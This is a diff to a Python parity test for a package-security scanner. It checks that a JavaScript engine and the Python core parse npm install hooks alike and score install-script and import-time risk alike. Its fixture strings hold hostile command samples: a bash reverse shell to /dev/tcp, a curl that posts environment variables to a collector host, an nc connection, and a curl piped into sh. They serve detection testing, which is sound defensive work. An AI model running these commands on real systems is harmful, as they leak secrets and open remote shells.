@@ -1,6 +1,6 @@
 """Engine parity for following install hooks and the install-script and
 import-time tests: the npm engine's js/src/lib/hooks.js against
-lazaret.scanner.core (hook_script_targets, install_script_risk,
+lazaret.scanner.core (follow_hook, install_script_risk,
 import_time_risk, node_candidates, and what they rest on: _hook_tokens, a
 shlex tokenizer with a regex fallback, and the `node -e` pattern).
 
@@ -45,11 +45,11 @@ import { readFileSync } from "node:fs";
 import { pathToFileURL } from "node:url";
 const h = await import(pathToFileURL(process.argv[1]).href);
 const cases = JSON.parse(readFileSync(0, "utf8"));
-const results = cases.map((s) => [h.shlexSplit(s), h.hookTokens(s), h.hookScriptTargets(s),
+const results = cases.map((s) => [h.shlexSplit(s), h.hookTokens(s), h.followHook(s),
   h.installScriptRisk(s), h.importTimeRisk(s), h.nodeCandidates(s), h.nodeECodes(s)]);
 process.stdout.write(JSON.stringify({ twins: h.PY_TWINS, results }));
 """
-FIELDS = ("shlex tokens", "_hook_tokens", "hook_script_targets", "install_script_risk", "import_time_risk",
+FIELDS = ("shlex tokens", "_hook_tokens", "follow_hook", "install_script_risk", "import_time_risk",
           "node_candidates", "_NODE_E_RE codes")
 
 # Realistic hook commands and install / import-time scripts
@@ -108,6 +108,20 @@ CURATED = [
     "fetch('http://192.0.2.1/x')\n", "HTTP://10.0.0.1:8080/", "ba\u017fe https://pastebin.com.invalid/raw/x",
     "exec(\"bash -i >& /dev/tcp/192.0.2.1/4444 0>&1\")\n", "{**os.environ}\nimport httpx\n",
     "curl " + "--a-b " * 25 + "x", "curl -a " * 200 + "https://files.invalid", "| sh " * 50,
+    # wrappers and their options, fd numbers, node -e in a directory, the limits
+    "sudo -u me node x.js", "sudo -E -H node x.js", "sudo -D sub node x.js", "sudo --chdir=sub node x.js",
+    "env -i node x.js", "env - node x.js", "env -u X node x.js", "env -uX node x.js", "env --unset=X node x.js",
+    "env -C sub node x.js", "env -Csub node x.js", "env --chdir sub node x.js", "cd a && env -C ../b node x.js",
+    "env -C ~ node x.js", "env -S \"node x.js\"", "env -S'node -r ./p.js x.js'", "env --split-string='node y.js'",
+    "env -S 'cd lib && node z.js'", "nice -n 5 node x.js", "nice -10 node x.js", "time -o f.txt node x.js",
+    "time -p node x.js", "exec -a name node x.js", "dotenv -e .env -- node x.js", "dotenv -v A=1 node x.js",
+    "command -p node x.js", "nohup node x.js &", "sudo -u me env -C sub A=1 node x.js", "sudo -- node x.js",
+    "1>out node x.js", "2>&1 node x.js", "node x.js 2> err.log", "node x.js 2>&1 3>&- 4<in",
+    "echo 5 > f; node x.js", "node -e \"require('./a')\" && cd lib && node --eval=\"require('./b')\"",
+    "cd lib && node -p \"require('../c')\"", "npx node -e \"require('./d')\"",
+    "cd a;" * 1200 + "node x.js", "node x.js;" * 1200, " ".join(f"node s{n}.js" for n in range(150)).replace(" node", "; node"),
+    "node " + "a" * 4100 + ".js", "cd " + "a" * 4095 + " && node x.js", "x" * 100_001, "\U0001F600" * 50_001,
+    "node " + "\U0001F600" * 99_990,
 ]
 
 # The pieces random cases are made of. MIXED reaches every function; the
@@ -138,10 +152,14 @@ MIXED = [
     "execSync('curl https://x.invalid | sh')", "curl -a -a -a ",
     "curl --retry=3 --data \"$(env)\" -X POST https://collector.invalid", "nc -q1 collector.invalid 4444",
     "https://192.0.2.1", "HTTPS://1.2.3.4.5", "subprocess.run(", "os.system(",
+    "env -C ", "env -S ", "-C", "-S", "-u", "-D", "--chdir=", "--split-string=", "--unset=X ", "sudo -u me ",
+    "sudo -D ", "nice -n 5 ", "time -o f ", "dotenv -e .env -- ", "exec -a x ", "-Csub ", "2>", "1>", "3>&-",
+    "--eval=", "--print ",
 ]
 QUOTING = ["'", '"', "\\", " ", "\t", "\n", "\r", "a", "b", "&", "|", ";", "(", ")", "<", ">", "=", "$",
            "\x85", "\xa0", "\x1c", "\u00e9", "\U0001F600", "\ud83d"]
 CD = ["cd ", "cd ", "pushd ", "a", "b", "/", "/", ".", "..", "./", "../", "//", " && ", "; ", "node ", "x.js",
+      "env -C ", "sudo -D ", "env --chdir=", "env -S '", "node -e \"require('./r')\" ; ",
       "\\", " ", "-", "$", "~", "'", '"', "sh ", "-c ", "./y.sh", "python ", "p.py",
       "cd /. && ", "cd //. ; ", "cd /./ && ", "cd /a/.. && ", "cd /.. ; ", "cd ./. && ", "cd a/.. ; ",
       "node ./x.js ; ", "node a/../x.js ; ", "sh ./y.sh && ", "node ../z.js ; ", "node . ; ", "node .. ; "]
@@ -188,7 +206,7 @@ def shlex_tokens(cmd):
 def core_view(text):
     """core's answers for one case, in FIELDS order (as JSON would carry them)."""
     reasons, line = core.import_time_risk(text)
-    return [shlex_tokens(text), core._hook_tokens(text), core.hook_script_targets(text),
+    return [shlex_tokens(text), core._hook_tokens(text), list(core.follow_hook(text)),
             core.install_script_risk(text), [reasons, line], core.node_candidates(text),
             [next(g for g in m.groups() if g is not None) for m in core._NODE_E_RE.finditer(text)]]
 
@@ -234,14 +252,16 @@ class HookParityTests(unittest.TestCase):
         """Guards the comparison against a corpus that stopped exercising
         something: each count is well above zero for this seed."""
         counts = collections.Counter()
-        for tokens, _, targets, install, (on_import, _), _, codes in self.views:
+        for tokens, _, (targets, complete), install, (on_import, _), _, codes in self.views:
             counts["shlex raises"] += tokens is None
             counts["targets"] += bool(targets)
+            counts["not followed completely"] += not complete
             counts["node -e codes"] += bool(codes)
             for reason in install + on_import:
                 counts[reason.split(" (")[0]] += 1          # (the exfiltration reason names the address)
-        self.assertEqual(len(counts), 8, counts)            # 3 install-script reasons, 2 import-time ones
-        self.assertEqual({k: n for k, n in counts.items() if n < 100}, {}, counts)
+        self.assertEqual(len(counts), 9, counts)            # 3 install-script reasons, 2 import-time ones
+        self.assertEqual({k: n for k, n in counts.items() if n < 100 and k != "not followed completely"}, {}, counts)
+        self.assertGreaterEqual(counts["not followed completely"], 7, counts)   # the curated limit cases
 
     def test_pattern_text_and_names_are_cores(self):
         """The JS module carries core's pattern text verbatim, with the same
@@ -255,9 +275,14 @@ class HookParityTests(unittest.TestCase):
         for name, names in self.twins["sets"].items():
             with self.subTest(names=name):
                 self.assertEqual(sorted(names), sorted(getattr(core, name)))
+        for name, table in self.twins["maps"].items():
+            with self.subTest(options=name):
+                self.assertEqual(table, {k: sorted(v) for k, v in getattr(core, name).items()})
+        self.assertEqual(self.twins["limits"], {k: getattr(core, k) for k in
+                                                ("HOOK_MAX_CHARS", "HOOK_MAX_COMMANDS", "HOOK_MAX_TARGETS", "HOOK_MAX_PATH")})
         self.assertEqual(len(self.twins["patterns"]), 12)
         self.assertEqual(len(self.twins["sets"]), 8)
-
+        self.assertEqual(len(self.twins["maps"]), 3)
 
 if __name__ == "__main__":
     unittest.main()
